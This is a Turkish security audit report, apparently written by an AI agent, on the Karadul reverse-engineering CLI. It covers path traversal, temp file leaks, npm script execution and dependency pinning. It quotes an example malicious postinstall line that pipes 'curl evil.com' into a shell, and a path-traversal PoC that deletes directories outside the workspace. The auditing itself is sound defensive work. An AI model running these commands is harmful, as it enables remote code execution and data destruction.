# Karadul v1.0 Security Audit Report

**Tarih:** 2026-03-24
**Auditor:** Security Expert Agent (Claude Opus 4.6)
**Kapsam:** `karadul/` paketi + proje koku (pyproject.toml, .gitignore, signature DB)
**Test:** 1393/1393 test gecti (fix sonrasi)

---

## Ozet

| Severity | Bulgu | Duzeldi |
|----------|-------|---------|
| CRITICAL | 0 | - |
| HIGH | 3 | 3/3 |
| MEDIUM | 4 | 1/4 |
| LOW | 5 | 0/5 |
| INFO | 3 | 1/3 |

Genel degerlendirme: Proje guvenlik acisindan **iyi durumda**. `shell=True` kullanimi yok, `eval()/exec()` yok, `pickle.load()` yok, `yaml.safe_load` dogru kullaniliyor. Temel guvenlik pratikleri uygulanmis. Asagidaki bulgular "iyiden mukemmele" gecis icin.

---

## HIGH Bulgular

### HIGH-01: Path Traversal via `karadul clean` (DUZELTILDI)

- **CWE:** CWE-22 (Improper Limitation of a Pathname to a Restricted Directory)
- **CVSS:** 7.1 (High)
- **Dosya:** `karadul/cli.py` satir 539-548
- **Sorun:** `karadul clean ../../etc` gibi bir komutla workspace disindaki dizinler silinebiliyordu. `target` argumani dogrudan `Path(output_dir) / target` olarak kullaniliyordu, hicbir sanitization yoktu.
- **Etki:** Kullanici izniyle (--yes flag) keyfi dizin silme.
- **PoC:** `karadul clean "../../important_data" --yes`
- **Fix:** `.resolve()` sonrasi `startswith()` kontrolu eklendi. Simdi `target` resolve edildikten sonra base_dir altinda olup olmadigi dogrulaniyor.

### HIGH-02: Temp Dosya Sizintisi -- param_recovery.py (DUZELTILDI)

- **CWE:** CWE-459 (Incomplete Cleanup)
- **CVSS:** 3.3 (Low teknik, High operasyonel)
- **Dosya:** `karadul/reconstruction/param_recovery.py` satir 142-177
- **Sorun:** `output_json=None` durumunda olusturulan gecici JSON dosyasi, hata durumlarinda (3 farkli return noktasi) silinmiyordu. `/tmp/bw_param_recovery_*.json` dosyalari birikiyordu.
- **Etki:** Analiz edilen binary'nin fonksiyon isimleri, parametre isimleri gibi potansiyel hassas bilgiler `/tmp`'de kaliyor.
- **Fix:** Her hata return noktasina `json_path.unlink(missing_ok=True)` eklendi (sadece `output_json is None` durumunda).

### HIGH-03: npm install Postinstall Script Execution (DUZELTILDI)

- **CWE:** CWE-94 (Improper Control of Generation of Code)
- **CVSS:** 7.8 (High)
- **Dosya:** `karadul/cli.py` satir 452-458
- **Sorun:** `karadul run` komutu, reconstructed projedeki `package.json`'a gore `npm install` calistiriyordu. Malware analiz edilen bir uygulamanin package.json'inda `"postinstall": "curl evil.com | sh"` gibi script'ler olabilir.
- **Etki:** Analiz edilen malware'in keyfi kod calistirmasi.
- **Fix:** `npm install` yerine `npm install --ignore-scripts` kullanildi.

---

## MEDIUM Bulgular

### MED-01: .gitignore Eksiklikleri (DUZELTILDI)

- **CWE:** CWE-200 (Exposure of Sensitive Information)
- **Dosya:** `.gitignore`
- **Sorun:** `workspaces/`, `sigs/`, buyuk signature JSON dosyalari ve `--output` dosyasi .gitignore'da degildi.
  - `workspaces/` analiz edilen uygulamalarin kaynak kodunu, fonksiyon isimlerini, string'lerini iceriyor.
  - `sigs/combined_1M.json` 188MB -- repo'ya push edilirse GitHub limiti asar.
  - `--output` dosyasi 11MB yanlislikla olusmus subprocess dump'i.
- **Fix:** `.gitignore`'a `workspaces/`, `sigs/`, signature JSON'lari ve `--output` eklendi.

### MED-02: subprocess_runner.py Log'da Komut Tam Gosteriliyor

- **CWE:** CWE-532 (Insertion of Sensitive Information into Log File)
- **Dosya:** `karadul/core/subprocess_runner.py` satir 85-86
- **Sorun:** `cmd_str = " ".join(str(c) for c in cmd)` ile tum komut parametreleri `logger.info`'ya yaziliyor. Ileride API key veya token iceren komutlar eklenirse bunlar log'a yazilir.
- **Risk:** Suan dusuk (CLI araclari API key almaz), ama proje buyudukce risk artar.
- **Onerilen Fix:** Uzun argumanlari truncate et veya hassas pattern'leri maskele:
  ```python
  cmd_display = [str(c)[:100] for c in cmd[:5]]
  logger.info("Subprocess baslatiliyor: %s", " ".join(cmd_display))
  ```

### MED-03: karadul run -- Reconstructed Projede Keyfi Node.js Kodu Calistirma

- **CWE:** CWE-94 (Improper Control of Generation of Code)
- **Dosya:** `karadul/cli.py` satir 479-484
- **Sorun:** `node str(main_file)` ile reconstructed projenin JS dosyasi dogrudan calistirilir. Malware analiz ediliyorsa bu tehlikeli.
- **Risk:** Kullanici `karadul run` komutunu bilinçli olarak calistirir, bu bir "explicit user action". Ama CLI'da uyari yok.
- **Onerilen Fix:** `karadul run` basinda "Bu reconstructed kodu calistiracak, emin misiniz?" uyarisi ekle.

### MED-04: Pinlenmemis Dependency'ler

- **CWE:** CWE-1357 (Reliance on Insufficiently Trustworthy Component)
- **Dosya:** `pyproject.toml` satir 39-45
- **Sorun:** Ana dependency'ler minimum versiyon ile pinlenmis (`>=`), ust sinir yok:
  ```
  click>=8.1, rich>=13.0, pyyaml>=6.0, dataclasses-json>=0.6, tqdm>=4.60
  ```
  Bu, gelecekte breaking change veya supply chain saldirisi durumunda riski artirir.
- **Onerilen Fix:** Major versiyon siniri ekle: `click>=8.1,<9`, `rich>=13.0,<15` vb.

---

## LOW Bulgular

### LOW-01: npm view Package Name Dogrulanmiyor

- **Dosya:** `karadul/reconstruction/dependency_resolver.py` satir 325-326
- **Sorun:** `package_name` npm komutuna dogrudan geciriliyor. `shell=False` oldugu icin command injection yok, ama garip paket isimleri beklenmedik davranislara yol acabilir.
- **Risk:** Minimal -- npm view readonly islem.

### LOW-02: Ghidra CLI Proje Adinda Ozel Karakter

- **Dosya:** `karadul/ghidra/headless.py` satir 93
- **Sorun:** `project_name="karadul_analysis"` hardcoded, sorun yok. Ama gelecekte dinamik isim verilirse Ghidra'nin dosya sistemi erisiminde sorun olabilir.

### LOW-03: Binary Intelligence Scan Pattern'leri Cikti'da Gosteriliyor

- **Dosya:** `karadul/analyzers/binary_intelligence.py`
- **Sorun:** Analiz edilen binary'deki guvenlik bulguları (password pattern, crypto key vb.) raporda acikca gosteriliyor. Bu "by design" ama rapor paylasilirsa hassas bilgi sizabilir.

### LOW-04: Frida Session -- Script Source Dogrulanmiyor

- **Dosya:** `karadul/frida/session.py` satir 200-217
- **Sorun:** `load_script_source()` herhangi bir JS kodu kabul eder. Frida session zaten privilege gerektirdigi icin dusuk risk.

### LOW-05: Workspace Artifact Save'de Dosya Adi Sanitization Yok

- **Dosya:** `karadul/core/workspace.py` satir 93-115
- **Sorun:** `save_artifact(stage, name, data)` metodu `name` parametresini dogrudan `stage_dir / name` olarak kullaniyor. `name` icinde `../` olabilir. Ancak caller her zaman iceriden kontrol edilen isimler gonderiyor, kullanici girdisi degil.

---

## INFO Bulgular

### INFO-01: `--output` Dosyasi Proje Kokunde (DUZELTILDI gitignore ile)

- **Dosya:** `/Users/apple/Desktop/dosyalar/projex/black-widow/--output` (11MB)
- **Sorun:** Yanlislikla olusturulmus subprocess ciktisi. Icinde decompile edilmis Node.js kodu var. `.gitignore`'a eklendi.
- **Oneri:** Dosyayi silin: `rm -- ./--output`

### INFO-02: Buyuk Signature DB Dosyalari Proje Kokunde

- **Dosyalar:**
  - `signatures_homebrew.json` (22MB)
  - `signatures_homebrew_bytes.json` (6MB)
  - `sigs/combined_1M.json` (188MB)
  - `sigs/macos_frameworks_full.json` (36MB)
- **Sorun:** Bu dosyalar hassas veri icermiyor (kutuphane fonksiyon signature'lari) ama cok buyuk. Repo'ya push edilmemeli. `.gitignore`'a eklendi.

### INFO-03: YAML safe_load Dogru Kullaniliyor

- **Dosya:** `karadul/config.py` satir 240, 246
- **Durum:** `yaml.safe_load()` kullaniliyor, `yaml.load()` (unsafe) yok. Dogru pratik.

---

## Pozitif Guvenlik Bulgulari (Iyi Yapilmis)

1. **shell=True KULLANILMIYOR** -- Tum subprocess cagrilari list formunda, shell injection riski yok.
2. **eval()/exec() YOK** -- Dinamik kod calistirma yok (tek `eval` Ghidra signature DB'deki QCoreApplication::exec() string'i).
3. **pickle.load() YOK** -- Unsafe deserialization yok.
4. **yaml.safe_load() KULLANILIYOR** -- YAML deserialization guvenli.
5. **Path traversal koruması VAR** -- `packed_binary.py` satir 837-844'te `..` filtreleme + `startswith` kontrolu.
6. **html.escape() KULLANILIYOR** -- HTML raporlarinda XSS koruması var (`_esc()` fonksiyonu).
7. **Temp dosya temizligi GENEL OLARAK YAPILIYOR** -- `context_namer.py`, `llm_namer.py`, `jsnice_renamer.py`, `synchrony_wrapper.py`, `stages.py` hepsi `finally` bloklarinda temizlik yapiyor.
8. **Timeout HER YERDE VAR** -- Tum subprocess cagrilarinda timeout parametresi kullaniliyor (DoS riski dusuk).
9. **Workspace isim sanitizasyonu VAR** -- `Workspace._sanitize_name()` ozel karakterleri alt cizgiye donusturuyor.

---

## OWASP Top 10 Kontrolu

| # | Kategori | Durum | Not |
|---|----------|-------|-----|
| A01 | Broken Access Control | N/A | CLI araci, kullanici yetkilendirmesi yok |
| A02 | Cryptographic Failures | PASS | SHA-256 hash dogru kullaniliyor |
| A03 | Injection | PASS | shell=True yok, eval yok |
| A04 | Insecure Design | PASS | Defense-in-depth yaklasimi var |
| A05 | Security Misconfiguration | FIX | .gitignore eksikleri duzeltildi |
| A06 | Vulnerable Components | WARN | Dependency'ler pinlenmemis (MED-04) |
| A07 | Auth Failures | N/A | Authentication yok |
| A08 | Data Integrity Failures | PASS | Signature DB integrity kontrol edilebilir |
| A09 | Logging Failures | WARN | Komut parametreleri loglanabiliyor (MED-02) |
| A10 | SSRF | N/A | HTTP istekleri sadece npm registry'ye |

---

## Sonuc ve Oneriler

Karadul v1.0 guvenlik acisindan saglam bir temele sahip. `shell=True` yok, `eval/exec` yok, path traversal korumalari var, HTML ciktilarda escape yapiliyor. Bu bir **reverse engineering araci** oldugu icin, analiz edilen hedeflerin kendisi zaten "guvenilmeyen girdi" -- bu bilinc kodda goruluyor (packed_binary.py'deki path traversal kontrolu gibi).

**Oncelikli aksiyonlar:**
1. `rm -- ./--output` -- gereksiz 11MB dump dosyasini sil
2. MED-03 icin `karadul run` komutuna uyari ekle
3. MED-04 icin dependency ust sinirlarini belirle
4. Gelecekte API entegrasyonu eklenirse MED-02'yi uygula
